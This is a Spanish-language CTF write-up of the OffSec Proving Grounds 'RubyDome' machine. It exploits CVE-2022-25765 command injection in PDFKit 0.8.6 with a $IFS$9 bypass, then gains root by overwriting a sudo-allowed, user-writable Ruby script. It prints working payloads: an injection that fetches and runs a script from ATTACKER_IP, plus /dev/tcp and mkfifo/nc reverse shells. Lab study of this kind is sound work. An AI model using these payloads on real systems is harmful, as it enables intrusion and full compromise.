---
title: "RubyDome"
description: "Writeup de la máquina RubyDome de OffSec Proving Grounds: inyección de comandos OS en PDFKit 0.8.6 (CVE-2022-25765) con bypass $IFS$9 para evadir el filtrado de espacios, y escalada a root explotando una regla sudo sobre un script Ruby que el propio usuario puede sobreescribir."
date: 2026-11-20
creator: "OffSec"
rating: 4.0
dificultad: "Fácil"
author: "Ghxstsec"
draft: false
type: "post"
---

RubyDome | OffSec Proving Grounds Writeup
==========================================

**Plataforma:** OffSec Proving Grounds · **SO:** Linux · **Dificultad:** Fácil

RubyDome es una aplicación web Sinatra ("HTML to PDF") que usa la gema **pdfkit 0.8.6** y
`wkhtmltopdf` para convertir URLs a PDF. La versión de PDFKit es vulnerable a
**inyección de comandos OS** (CVE-2022-25765): el parámetro `url` del formulario se
inserta sin sanitizar en una cadena pasada a `IO.popen`, que invoca `/bin/sh -c`. El
escalado a root es igualmente directo: una regla sudo permite ejecutar `ruby app.rb` como
root sin contraseña, y el propio archivo `app.rb` tiene permisos de escritura para el
usuario.

---

## Reconocimiento

```bash
nmap -sC -sV -p- --min-rate 3000 192.168.164.22
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
3000/tcp open  http    WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: RubyDome HTML to PDF
```

Solo dos puertos. El título ya lo dice todo. La app expone un formulario con un único
campo `url` y un botón "Convert to PDF". Cualquier error 500 vuelca el stack trace
completo, lo que revela:

```
/var/lib/gems/3.0.0/gems/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb:84:in `to_pdf'
```

**Versión identificada: pdfkit 0.8.6** → CVE-2022-25765.

---

## Acceso inicial — CVE-2022-25765 (command injection en PDFKit)

### Por qué funciona

PDFKit 0.8.6 construye el comando de wkhtmltopdf así (fragmento de `pdfkit.rb`):

```ruby
def command(path = nil)
  shell_escaped_command = [executable, OS::shell_escape_for_os(args)].join ' '
  input_for_command = @source.to_input_for_command   # ← URL sin escapar
  "#{shell_escaped_command} #{input_for_command} #{output_for_command}"
end
```

Y en `source.rb`, las URLs se envuelven solo con comillas dobles:

```ruby
def to_input_for_command
  %{"#{shell_safe_url}"}   # ← comillas dobles, no Shellwords
end
```

Esta cadena completa se pasa a **`IO.popen(string)`** (no como array), lo que invoca
`/bin/sh -c "...comando..."`. Dentro de comillas dobles en bash, `$(...)` y los
backticks se expanden (command substitution). El método `shell_safe_url` aplica
`URI::DEFAULT_PARSER.escape`, que codifica espacio→`%20`, `<>{}"|#`, pero **no** los
caracteres `$`, `(`, `)`, `;`, `/`, `:`.

### Bypass del filtro de espacios: `$IFS$9`

El espacio literal quedaría como `%20` y rompería la inyección. Usamos `$IFS$9`:

- `$IFS` es la variable de separador de campo del shell (espacio/tab/newline)
- `$9` es el noveno parámetro posicional (vacío en este contexto), pero sirve para
  terminar el nombre de la variable `IFS` sin necesitar llaves `{}`
- Las llaves `{}` se codificarían a `%7B%7D`, así que `${IFS}` no funciona

El resultado: `curl$IFS$9192.168.45.215` ≡ `curl 192.168.45.215` para el shell.

### Confirmación blind (time-based)

```bash
# Baseline ~0.22s
curl -X POST http://192.168.164.22:3000/pdf --data-urlencode "url=http://127.0.0.1:1/"

# Con sleep 5 → ~5.21s → ¡RCE confirmado!
curl -X POST http://192.168.164.22:3000/pdf \
  --data-urlencode 'url=http://127.0.0.1:1/$(/bin/sleep$IFS$95)'
```

### Reverse shell

```bash
# 1. Script de reverse shell
cat > s.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4455 0>&1
EOF

# 2. Servir por HTTP
python3 -m http.server --bind ATTACKER_IP 8000

# 3. Listener
nc -lvnp 4455

# 4. Payload de inyección
curl -X POST http://192.168.164.22:3000/pdf \
  --data-urlencode 'url=http://127.0.0.1:1/$(curl$IFS$9ATTACKER_IP:8000/s.sh$IFS$9-o$IFS$9/tmp/s.sh;bash$IFS$9/tmp/s.sh)'
```

**Shell obtenida:**

```
andrew@rubydome:~/app$ id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
```


---

## Escalada de privilegios — Sudo sobre script writable

### Enumeración

```bash
sudo -n -l
```

```
User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

```bash
ls -la /home/andrew/app/app.rb
```

```
-rwxrwx--- 1 andrew andrew 1032 Apr 24  2023 app.rb
```

La regla sudo especifica el binario ruby y la ruta del script, pero `andrew` es el
**propietario** del archivo y tiene permisos de escritura. Nada impide modificarlo antes
de ejecutarlo con sudo.

### Explotación

```bash
# 1. Sobreescribir app.rb con payload Ruby que conecta reverse shell
printf 'system("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4466>/tmp/f")\n' \
  > /home/andrew/app/app.rb

# 2. Listener
nc -lvnp 4466

# 3. Ejecutar como root (sin contraseña)
sudo /usr/bin/ruby /home/andrew/app/app.rb
```

**Shell root:**

```
# id
uid=0(root) gid=0(root) groups=0(root)
```


---

## Cadena de ataque

```
POST /pdf?url=http://.../$($IFS$9bypass)
        │
        ▼
   CVE-2022-25765 → shell como andrew (uid=1001)
        │
        ▼
   sudo -l → NOPASSWD ruby app.rb (ALL)
   app.rb → -rwxrwx--- (writable por andrew)
        │
        ▼
   echo payload > app.rb → sudo ruby app.rb → root (uid=0)
```

---

## Lecciones

- **Nunca usar `IO.popen(string)`** con input del usuario: pasar siempre el comando como
  array para evitar la invocación del shell.
- **Nunca dar sudo sobre un script que el usuario puede modificar**: el permiso es sobre
  el intérprete, pero si el script es writable, el usuario controla lo que se ejecuta
  como root.
- Los bypass de filtrado de caracteres shell como `$IFS$9` son clásicos y bien
  documentados; cualquier escapado que no use `Shellwords.shellescape` sobre cada
  argumento individualmente es insuficiente.
